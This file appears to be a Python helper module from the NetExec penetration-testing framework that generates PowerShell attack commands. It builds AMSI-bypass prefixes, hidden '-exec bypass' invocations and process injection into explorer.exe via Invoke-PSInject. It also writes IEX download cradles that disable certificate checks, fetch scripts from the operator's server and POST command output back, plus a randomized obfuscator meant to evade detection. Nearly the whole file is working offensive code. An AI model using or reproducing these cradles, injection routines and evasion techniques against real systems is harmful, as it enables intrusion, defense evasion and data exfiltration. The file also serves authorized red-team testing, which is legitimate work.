import os
import re
from sys import exit
from string import ascii_lowercase
from random import choice, sample
from subprocess import call
from nxc.helpers.misc import which
from nxc.logger import nxc_logger
from nxc.paths import NXC_PATH, DATA_PATH
from base64 import b64encode
import random

obfuscate_ps_scripts = False

def replace_singles(s):
    """Replaces single quotes with a double quote
    We do this because quoting is very important in PowerShell, and we are doing multiple layers:
    Python, MSSQL, and PowerShell. We want to make sure that the command is properly quoted at each layer.

    Args:
    ----
        s (str): The string to replace single quotes in.

    Returns:
    -------
        str: Original string with single quotes replaced with double.
    """
    return s.replace("'", r"\"")

def get_ps_script(path):
    """Generates a full path to a PowerShell script given a relative path.

    Parameters
    ----------
        path (str): The relative path to the PowerShell script.

    Returns
    -------
        str: The full path to the PowerShell script.
    """
    return os.path.join(DATA_PATH, path)


def encode_ps_command(command):
    """
    Encodes a PowerShell command into a base64-encoded string.

    Args:
    ----
        command (str): The PowerShell command to encode.

    Returns:
    -------
        str: The base64-encoded string representation of the encoded command.
    """
    return b64encode(command.encode("UTF-16LE")).decode()


def is_powershell_installed():
    """
    Check if PowerShell is installed.

    Returns
    -------
        bool: True if PowerShell is installed, False otherwise.
    """
    if which("powershell"):
        return True
    return False


def obfs_ps_script(path_to_script):
    """
    Obfuscates a PowerShell script.

    Args:
    ----
        path_to_script (str): The path to the PowerShell script.

    Returns:
    -------
        str: The obfuscated PowerShell script.

    Raises:
    ------
        FileNotFoundError: If the script file does not exist.
        OSError: If there is an error during obfuscation.
    """
    ps_script = path_to_script.split("/")[-1]
    obfs_script_dir = os.path.join(NXC_PATH, "obfuscated_scripts")
    obfs_ps_script = os.path.join(obfs_script_dir, ps_script)

    if is_powershell_installed() and obfuscate_ps_scripts:
        if os.path.exists(obfs_ps_script):
            nxc_logger.display("Using cached obfuscated Powershell script")
            with open(obfs_ps_script) as script:
                return script.read()

        nxc_logger.display("Performing one-time script obfuscation, go look at some memes cause this can take a bit...")

        invoke_obfs_command = f"powershell -C 'Import-Module {get_ps_script('invoke-obfuscation/Invoke-Obfuscation.psd1')};Invoke-Obfuscation -ScriptPath {get_ps_script(path_to_script)} -Command \"TOKEN,ALL,1,OUT {obfs_ps_script}\" -Quiet'"
        nxc_logger.debug(invoke_obfs_command)

        with open(os.devnull, "w") as devnull:
            call(invoke_obfs_command, stdout=devnull, stderr=devnull, shell=True)

        nxc_logger.success("Script obfuscated successfully")

        with open(obfs_ps_script) as script:
            return script.read()

    else:
        with open(get_ps_script(path_to_script)) as script:
            """
            Strip block comments, line comments, empty lines, verbose statements,
            and debug statements from a PowerShell source file.
            """
            # strip block comments
            stripped_code = re.sub(re.compile("<#.*?#>", re.DOTALL), "", script.read())
            # strip blank lines, lines starting with #, and verbose/debug statements
            return "\n".join([line for line in stripped_code.split("\n") if ((line.strip() != "") and (not line.strip().startswith("#")) and (not line.strip().lower().startswith("write-verbose ")) and (not line.strip().lower().startswith("write-debug ")))])



def create_ps_command(ps_command, force_ps32=False, obfs=False, custom_amsi=None, encode=True):
    """
    Generates a PowerShell command based on the provided `ps_command` parameter.

    Args:
    ----
        ps_command (str): The PowerShell command to be executed.
        force_ps32 (bool, optional): Whether to force PowerShell to run in 32-bit mode. Defaults to False.
        obfs (bool, optional): Whether to obfuscate the generated command. Defaults to False.
        custom_amsi (str, optional): Path to a custom AMSI bypass script. Defaults to None.
        encode (bool, optional): Whether to encode the generated command (executed via -enc in PS). Defaults to True.

    Returns:
    -------
        str: The generated PowerShell command.
    """
    nxc_logger.debug(f"Creating PS command parameters: {ps_command=}, {force_ps32=}, {obfs=}, {custom_amsi=}, {encode=}")
    
    if custom_amsi:
        nxc_logger.debug(f"Using custom AMSI bypass script: {custom_amsi}")
        with open(custom_amsi) as file_in:
            lines = list(file_in)
            amsi_bypass = "".join(lines)
    else:
        amsi_bypass = ""

    # for readability purposes, we do not do a one-liner
    if force_ps32:  # noqa: SIM108
        # https://stackoverflow.com/a/60155248
        command = amsi_bypass + f"$functions = {{function Command-ToExecute{{{amsi_bypass + ps_command}}}}}; if ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64'){{$job = Start-Job -InitializationScript $functions -ScriptBlock {{Command-ToExecute}} -RunAs32; $job | Wait-Job | Receive-Job }} else {{IEX '$functions'; Command-ToExecute}}"
    else:
        command = f"{amsi_bypass} {ps_command}"
    
    nxc_logger.debug(f"Generated PS command:\n {command}\n")

    if obfs:
        nxc_logger.debug("Obfuscating PowerShell command")
        obfs_attempts = 0
        while True:
            nxc_logger.debug(f"Obfuscation attempt: {obfs_attempts + 1}")
            obfs_command = invoke_obfuscation(command)
            
            command = f'powershell.exe -exec bypass -noni -nop -w 1 -C "{replace_singles(obfs_command)}"'
            if len(command) <= 8191:
                break
            if obfs_attempts == 4:
                nxc_logger.error(f"Command exceeds maximum length of 8191 chars (was {len(command)}). exiting.")
                exit(1)
            nxc_logger.debug(f"Obfuscation length too long with {len(command)}, trying again...")
            obfs_attempts += 1
    else:
        # if we arent encoding or obfuscating anything, we quote the entire powershell in double quotes, otherwise the final powershell command will syntax error
        command = f"-enc {encode_ps_command(command)}" if encode else f'"{command}"'
        command = f"powershell.exe -noni -nop -w 1 {command}"
        
        if len(command) > 8191:
            nxc_logger.error(f"Command exceeds maximum length of 8191 chars (was {len(command)}). exiting.")
            exit(1)
            
    nxc_logger.debug(f"Final command: {command}")
    return command


def gen_ps_inject(command, context=None, procname="explorer.exe", inject_once=False):
    """
    Generates a PowerShell code block for injecting a command into a specified process.

    Args:
    ----
        command (str): The command to be injected.
        context (str, optional): The context in which the code block will be injected. Defaults to None.
        procname (str, optional): The name of the process into which the command will be injected. Defaults to "explorer.exe".
        inject_once (bool, optional): Specifies whether the command should be injected only once. Defaults to False.

    Returns:
    -------
        str: The generated PowerShell code block.
    """
    # The following code gives us some control over where and how Invoke-PSInject does its thang
    # It prioritizes injecting into a process of the active console session
    ps_code = """
$injected = $False
$inject_once = {inject_once}
$command = "{command}"
$owners = @{{}}
$console_login = gwmi win32_computersystem | select -exp Username
gwmi win32_process | where {{$_.Name.ToLower() -eq '{procname}'.ToLower()}} | % {{
    if ($_.getowner().domain -and $_.getowner().user){{
    $owners[$_.getowner().domain + "\\" + $_.getowner().user] = $_.handle
    }}
}}
try {{
    if ($owners.ContainsKey($console_login)){{
        Invoke-PSInject -ProcId $owners.Get_Item($console_login) -PoshCode $command
        $injected = $True
        $owners.Remove($console_login)
    }}
}}
catch {{}}
if (($injected -eq $False) -or ($inject_once -eq $False)){{
    foreach ($owner in $owners.Values) {{
        try {{
            Invoke-PSInject -ProcId $owner -PoshCode $command
        }}
        catch {{}}
    }}
}}
""".format(
        inject_once="$True" if inject_once else "$False",
        command=encode_ps_command(command),
        procname=procname,
    )

    if context:
        return gen_ps_iex_cradle(context, "Invoke-PSInject.ps1", ps_code, post_back=False)

    return ps_code


def gen_ps_iex_cradle(context, scripts, command="", post_back=True):
    """
    Generates a PowerShell IEX cradle script for executing one or more scripts.

    Args:
    ----
        context (Context): The context object containing server and port information.
        scripts (str or list): The script(s) to be executed.
        command (str, optional): A command to be executed after the scripts are executed. Defaults to an empty string.
        post_back (bool, optional): Whether to send a POST request with the command. Defaults to True.

    Returns:
    -------
        str: The generated PowerShell IEX cradle script.
    """
    if isinstance(scripts, str):
        launcher = """
[Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}}
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/{ps_script_name}')
{command}
""".format(
            server=context.server,
            port=context.server_port,
            addr=context.localip,
            ps_script_name=scripts,
            command=command if post_back is False else "",
        ).strip()

    elif isinstance(scripts, list):
        launcher = "[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\n"
        launcher += "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'"
        for script in scripts:
            launcher += f"IEX (New-Object Net.WebClient).DownloadString('{context.server}://{context.localip}:{context.server_port}/{script}')\n"
        launcher.strip()
        launcher += command if post_back is False else ""

    if post_back is True:
        launcher += f"""
$cmd = {command}
$request = [System.Net.WebRequest]::Create('{context.server}://{context.localip}:{context.server_port}/')
$request.Method = 'POST'
$request.ContentType = 'application/x-www-form-urlencoded'
$bytes = [System.Text.Encoding]::ASCII.GetBytes($cmd)
$request.ContentLength = $bytes.Length
$requestStream = $request.GetRequestStream()
$requestStream.Write($bytes, 0, $bytes.Length)
$requestStream.Close()
$request.GetResponse()"""

    nxc_logger.debug(f"Generated PS IEX Launcher:\n {launcher}\n")

    return launcher.strip()


# Following was stolen from https://raw.githubusercontent.com/GreatSCT/GreatSCT/templates/invokeObfuscation.py
def invoke_obfuscation(script_string):
    """
    Obfuscates a script string and generates an obfuscated payload for execution.

    Args:
    ----
        script_string (str): The script string to obfuscate.

    Returns:
    -------
        str: The obfuscated payload for execution.
    """
    nxc_logger.debug(f"Command before obfuscation: {script_string}")
    random_alphabet = "".join(random.choice([i.upper(), i]) for i in ascii_lowercase)
    random_delimiters = ["_", "-", ",", "{", "}", "~", "!", "@", "%", "&", "<", ">", ";", ":", *list(random_alphabet)]

    # Only use a subset of current delimiters to randomize what you see in every iteration of this script's output.
    random_delimiters = [choice(random_delimiters) for _ in range(int(len(random_delimiters) / 4))]

    # Convert $ScriptString to delimited ASCII values in [Char] array separated by random delimiter from defined list $RandomDelimiters.
    delimited_encoded_array = ""
    for char in script_string:
        delimited_encoded_array += str(ord(char)) + choice(random_delimiters)

    # Remove trailing delimiter from $DelimitedEncodedArray.
    delimited_encoded_array = delimited_encoded_array[:-1]
    # Create printable version of $RandomDelimiters in random order to be used by final command.
    test = sample(random_delimiters, len(random_delimiters))
    random_delimiters_to_print = "".join(i for i in test)

    # Generate random case versions for necessary operations.
    for_each_object = choice(["ForEach", "ForEach-Object", "%"])
    str_join = "".join(choice([i.upper(), i.lower()]) for i in "[String]::Join")
    str_str = "".join(choice([i.upper(), i.lower()]) for i in "[String]")
    join = "".join(choice([i.upper(), i.lower()]) for i in "-Join")
    char_str = "".join(choice([i.upper(), i.lower()]) for i in "Char")
    integer = "".join(choice([i.upper(), i.lower()]) for i in "Int")
    for_each_object = "".join(choice([i.upper(), i.lower()]) for i in for_each_object)

    # Create printable version of $RandomDelimiters in random order to be used by final command specifically for -Split syntax
    random_delimiters_to_print_for_dash_split = ""

    for delim in random_delimiters:
        # Random case 'split' string.
        split = "".join(choice([i.upper(), i.lower()]) for i in "Split")
        random_delimiters_to_print_for_dash_split += "-" + split + choice(["", " "]) + "'" + delim + "'" + choice(["", " "])

    random_delimiters_to_print_for_dash_split = random_delimiters_to_print_for_dash_split.strip("\t\n\r")
    # Randomly select between various conversion syntax options.
    random_conversion_syntax = [
        "[" + char_str + "]" + choice(["", " "]) + "[" + integer + "]" + choice(["", " "]) + "$_",
        "[" + integer + "]" + choice(["", " "]) + "$_" + choice(["", " "]) + choice(["-as", "-As", "-aS", "-AS"]) + choice(["", " "]) + "[" + char_str + "]",
    ]
    random_conversion_syntax = choice(random_conversion_syntax)

    # Create array syntax for encoded scriptString as alternative to .Split/-Split syntax.
    encoded_array = ""
    for char in script_string:
        encoded_array += str(ord(char)) + choice(["", " "]) + "," + choice(["", " "])

    # Remove trailing comma from encoded_array
    encoded_array = "(" + choice(["", " "]) + encoded_array.rstrip().rstrip(",") + ")"

    # Generate random syntax to create/set OFS variable ($OFS is the Output Field Separator automatic variable).
    # Using Set-Item and Set-Variable/SV/SET syntax. Not using New-Item in case OFS variable already exists.
    # If the OFS variable did exist then we could use even more syntax:
    # $varname, Set-Variable/SV, Set-Item/SET, Get-Variable/GV/Variable, Get-ChildItem/GCI/ChildItem/Dir/Ls
    # For more info:
    # https://msdn.microsoft.com/en-us/powershell/reference/5.1/microsoft.powershell.core/about/about_automatic_variables

    set_ofs_var_syntax = [
        "Set-Item" + choice([" " * 1, " " * 2]) + "'Variable:OFS'" + choice([" " * 1, " " * 2]) + "''",
        choice(["Set-Variable", "SV", "SET"]) + choice([" " * 1, " " * 2]) + "'OFS'" + choice([" " * 1, " " * 2]) + "''",
    ]
    set_ofs_var = choice(set_ofs_var_syntax)

    set_ofs_var_back_syntax = [
        "Set-Item" + choice([" " * 1, " " * 2]) + "'Variable:OFS'" + choice([" " * 1, " " * 2]) + "' '",
        "Set-Item" + choice([" " * 1, " " * 2]) + "'Variable:OFS'" + choice([" " * 1, " " * 2]) + "' '",
    ]
    set_ofs_var_back = choice(set_ofs_var_back_syntax)

    # Randomize case of $SetOfsVar and $SetOfsVarBack.
    set_ofs_var = "".join(choice([i.upper(), i.lower()]) for i in set_ofs_var)
    set_ofs_var_back = "".join(choice([i.upper(), i.lower()]) for i in set_ofs_var_back)

    # Generate the code that will decrypt and execute the payload and randomly select one.
    base_script_array = [
        "[" + char_str + "[]" + "]" + choice(["", " "]) + encoded_array,
        "(" + choice(["", " "]) + "'" + delimited_encoded_array + "'." + split + "(" + choice(["", " "]) + "'" + random_delimiters_to_print + "'" + choice(["", " "]) + ")" + choice(["", " "]) + "|" + choice(["", " "]) + for_each_object + choice(["", " "]) + "{" + choice(["", " "]) + "(" + choice(["", " "]) + random_conversion_syntax + ")" + choice(["", " "]) + "}" + choice(["", " "]) + ")",
        "(" + choice(["", " "]) + "'" + delimited_encoded_array + "'" + choice(["", " "]) + random_delimiters_to_print_for_dash_split + choice(["", " "]) + "|" + choice(["", " "]) + for_each_object + choice(["", " "]) + "{" + choice(["", " "]) + "(" + choice(["", " "]) + random_conversion_syntax + ")" + choice(["", " "]) + "}" + choice(["", " "]) + ")",
        "(" + choice(["", " "]) + encoded_array + choice(["", " "]) + "|" + choice(["", " "]) + for_each_object + choice(["", " "]) + "{" + choice(["", " "]) + "(" + choice(["", " "]) + random_conversion_syntax + ")" + choice(["", " "]) + "}" + choice(["", " "]) + ")",
    ]
    # Generate random JOIN syntax for all above options
    new_script_array = [
        choice(base_script_array) + choice(["", " "]) + join + choice(["", " "]) + "''",
        join + choice(["", " "]) + choice(base_script_array),
        str_join + "(" + choice(["", " "]) + "''" + choice(["", " "]) + "," + choice(["", " "]) + choice(base_script_array) + choice(["", " "]) + ")",
        '"' + choice(["", " "]) + "$(" + choice(["", " "]) + set_ofs_var + choice(["", " "]) + ")" + choice(["", " "]) + '"' + choice(["", " "]) + "+" + choice(["", " "]) + str_str + choice(base_script_array) + choice(["", " "]) + "+" + '"' + choice(["", " "]) + "$(" + choice(["", " "]) + set_ofs_var_back + choice(["", " "]) + ")" + choice(["", " "]) + '"',
    ]

    # Randomly select one of the above commands.
    new_script = choice(new_script_array)

    # Generate random invoke operation syntax
    # Below code block is a copy from Out-ObfuscatedStringCommand.ps1
    # It is copied into this encoding function so that this will remain a standalone script without dependencies
    invoke_expression_syntax = [choice(["IEX", "Invoke-Expression"])]

    # Added below slightly-randomized obfuscated ways to form the string 'iex' and then invoke it with . or &.
    # Though far from fully built out, these are included to highlight how IEX/Invoke-Expression is a great indicator,
    # but not a silver bullet
    # These methods draw on common environment variable values and PowerShell Automatic Variable
    # values/methods/members/properties/etc.
    invocation_operator = choice([".", "&"]) + choice(["", " "])
    invoke_expression_syntax.extend((invocation_operator + "( $ShellId[1]+$ShellId[13]+'x')", invocation_operator + "( $PSHome[" + choice(["4", "21"]) + "]+$PSHOME[" + choice(["30", "34"]) + "]+'x')", invocation_operator + "( $env:Public[13]+$env:Public[5]+'x')", invocation_operator + "( $env:ComSpec[4," + choice(["15", "24", "26"]) + ",25]-Join'')", invocation_operator + "((" + choice(["Get-Variable", "GV", "Variable"]) + " '*mdr*').Name[3,11,2]-Join'')", invocation_operator + "( " + choice(["$VerbosePreference.ToString()", "([String]$VerbosePreference)"]) + "[1,3]+'x'-Join'')"))

    # Randomly choose from above invoke operation syntaxes.
    invoke_expression = choice(invoke_expression_syntax)

    # Randomize the case of selected invoke operation.
    invoke_expression = "".join(choice([i.upper(), i.lower()]) for i in invoke_expression)

    # Choose random Invoke-Expression/IEX syntax and ordering: IEX ($ScriptString) or ($ScriptString | IEX)
    invoke_options = [
        choice(["", " "]) + invoke_expression + choice(["", " "]) + "(" + choice(["", " "]) + new_script + choice(["", " "]) + ")" + choice(["", " "]),
        choice(["", " "]) + new_script + choice(["", " "]) + "|" + choice(["", " "]) + invoke_expression,
    ]

    obfuscated_script = choice(invoke_options)
    nxc_logger.debug(f"Script after obfuscation: {obfuscated_script}")
    return obfuscated_script

